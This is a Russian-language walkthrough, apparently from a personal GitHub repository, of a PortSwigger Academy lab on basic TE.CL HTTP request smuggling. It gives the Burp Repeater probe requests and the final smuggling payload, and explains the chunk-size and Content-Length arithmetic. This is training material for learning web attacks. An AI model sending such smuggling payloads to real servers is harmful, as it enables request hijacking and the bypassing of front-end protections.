Перейдем на уязвимый ресурс
Откроем `Proxy` -> `HTTP history`

и отправим в `Repeater` запрос на корневую страницу

Сразу же перейдем на версию `HTTP 1.1` через Inspector
и изменим метод запроса на `POST` 

Тем самым получив такой запрос
```
POST / HTTP/1.1
Host: 0a9300ca03353c84804867b4003e00df.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 0
```
и 200 ответ
![img](https://github.com/adyatlove/PortSwiggerAcademy/blob/main/25.%20HTTP%20request%20smuggling/2.%20HTTP%20request%20smuggling%2C%20basic%20TE.CL%20vulnerability/pics%20for%20walkthrough/1.png)

Далее воспользуемся пикчей в попытках поиска, на чем работает фронтенд, а на чем бэкенд
![img](https://github.com/adyatlove/PortSwiggerAcademy/blob/main/25.%20HTTP%20request%20smuggling/2.%20HTTP%20request%20smuggling%2C%20basic%20TE.CL%20vulnerability/pics%20for%20walkthrough/2.png)
```
POST / HTTP/1.1
Host: 0a9300ca03353c84804867b4003e00df.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 6
Transfer-Encoding: chunked

3
abc
X
```
и увидим, что выдало
`HTTP/1.1 400 Bad Request
{"error":"Invalid request"}`

согласно пикче, это означает, что на фронте `TE`, а на бэкенде или `CL или TE`
![img](https://github.com/adyatlove/PortSwiggerAcademy/blob/main/25.%20HTTP%20request%20smuggling/2.%20HTTP%20request%20smuggling%2C%20basic%20TE.CL%20vulnerability/pics%20for%20walkthrough/3.png)

Используем другой запрос
```
POST / HTTP/1.1
Host: 0a9300ca03353c84804867b4003e00df.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 6
Transfer-Encoding: chunked

0

X
```
В ответе получим таймаут, что согласно той же картинке, означает связку `TE.CL`
`Server Error: Communication timed out`
![img](https://github.com/adyatlove/PortSwiggerAcademy/blob/main/25.%20HTTP%20request%20smuggling/2.%20HTTP%20request%20smuggling%2C%20basic%20TE.CL%20vulnerability/pics%20for%20walkthrough/4.png)


Отлично, теперь мы разобрались кто что использует, теперь будем это все эксплуатировать
```
POST / HTTP/1.1
Host: 0a9300ca03353c84804867b4003e00df.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 4
Transfer-Encoding: chunked

56
GPOST / HTTP/1.1
Content-Type: application/x-www-form-urlencoded
Content-Length: 6

0
```
![img](https://github.com/adyatlove/PortSwiggerAcademy/blob/main/25.%20HTTP%20request%20smuggling/2.%20HTTP%20request%20smuggling%2C%20basic%20TE.CL%20vulnerability/pics%20for%20walkthrough/5.png)

А второй запрос - просто запрос на корневой страницу, который в ответ нам и пришлет желанную фразу - `"Unrecognized method GPOST"`
![img](https://github.com/adyatlove/PortSwiggerAcademy/blob/main/25.%20HTTP%20request%20smuggling/2.%20HTTP%20request%20smuggling%2C%20basic%20TE.CL%20vulnerability/pics%20for%20walkthrough/6.png)

А теперь давайте разберемся как мы получили наш изначальный запрос

Разберем нижний запрос
```
GPOST / HTTP/1.1
Content-Type: application/x-www-form-urlencoded
Content-Length: 6

0
```

`GPOST` стоит потому, что просто нужен GPOST по условию задания
Далее идет поле Content-length со значением 6, все потому, что оно должно превосходить байтовую составляющую того, что ниже. С помощью панели inspector мы понимаем - что байтовая составляющая нижней части - 5
Минимально близкое к 5 число, превосходящее его - это 6
отлично

![img](https://github.com/adyatlove/PortSwiggerAcademy/blob/main/25.%20HTTP%20request%20smuggling/2.%20HTTP%20request%20smuggling%2C%20basic%20TE.CL%20vulnerability/pics%20for%20walkthrough/7.png)

Далее перейдем к верхней части запроса
```
POST / HTTP/1.1
Host: 0a9300ca03353c84804867b4003e00df.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 4
Transfer-Encoding: chunked

56
```

Число `56` стоит из-за того, что байтовая составляющая нижестоящих заголовков (что ниже них - не считается) - составляет 56 байт

![img](https://github.com/adyatlove/PortSwiggerAcademy/blob/main/25.%20HTTP%20request%20smuggling/2.%20HTTP%20request%20smuggling%2C%20basic%20TE.CL%20vulnerability/pics%20for%20walkthrough/8.png)
